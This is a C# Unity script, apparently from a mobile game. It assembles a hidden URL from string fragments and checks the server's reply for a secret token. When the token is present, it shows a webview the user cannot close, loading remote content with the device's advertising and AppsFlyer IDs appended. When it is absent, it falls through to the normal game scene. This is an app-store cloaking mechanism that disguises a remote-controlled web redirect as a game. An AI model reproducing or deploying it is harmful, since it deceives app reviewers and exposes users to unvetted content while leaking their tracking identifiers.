using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainML : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string odinMLnaz = "";
    [HideInInspector] public string dvaMLnaz = "";

    

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("MentionMLallude", string.Empty) != string.Empty)
            {
                LATTICEMLVIEW(PlayerPrefs.GetString("MentionMLallude"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    dvaMLnaz += n;
                }
                StartCoroutine(IENUMENATORML());
            }
        }
        else
        {
            MovingML();
        }
    }



    private void MovingML()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Load");
    }

    private void LATTICEMLVIEW(string MentionMLallude, string NamingML = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _bindsML = gameObject.AddComponent<UniWebView>();
        _bindsML.SetToolbarDoneButtonText("");
        switch (NamingML)
        {
            case "0":
                _bindsML.SetShowToolbar(true, false, false, true);
                break;
            default:
                _bindsML.SetShowToolbar(false);
                break;
        }
        _bindsML.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _bindsML.OnShouldClose += (view) =>
        {
            return false;
        };
        _bindsML.SetSupportMultipleWindows(true);
        _bindsML.SetAllowBackForwardNavigationGestures(true);
        _bindsML.OnMultipleWindowOpened += (view, windowId) =>
        {
            _bindsML.SetShowToolbar(true);

        };
        _bindsML.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingML)
            {
                case "0":
                    _bindsML.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _bindsML.SetShowToolbar(false);
                    break;
            }
        };
        _bindsML.OnOrientationChanged += (view, orientation) =>
        {
            _bindsML.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _bindsML.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("MentionMLallude", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("MentionMLallude", url);
            }
        };
        _bindsML.Load(MentionMLallude);
        _bindsML.Show();
    }

    private IEnumerator IENUMENATORML()
    {
        using (UnityWebRequest ml = UnityWebRequest.Get(dvaMLnaz))
        {

            yield return ml.SendWebRequest();
            if (ml.isNetworkError)
            {
                MovingML();
            }
            int systemML = 7;
            while (PlayerPrefs.GetString("glrobo", "") == "" && systemML > 0)
            {
                yield return new WaitForSeconds(1);
                systemML--;
            }
            try
            {
                if (ml.result == UnityWebRequest.Result.Success)
                {
                    if (ml.downloadHandler.text.Contains("MrLprwlrGzxtRFW"))
                    {

                        try
                        {
                            var subs = ml.downloadHandler.text.Split('|');
                            LATTICEMLVIEW(subs[0] + "?idfa=" + odinMLnaz, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            LATTICEMLVIEW(ml.downloadHandler.text + "?idfa=" + odinMLnaz + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        MovingML();
                    }
                }
                else
                {
                    MovingML();
                }
            }
            catch
            {
                MovingML();
            }
        }
    }





    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaML") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { odinMLnaz = advertisingId; });
        }
    }


}
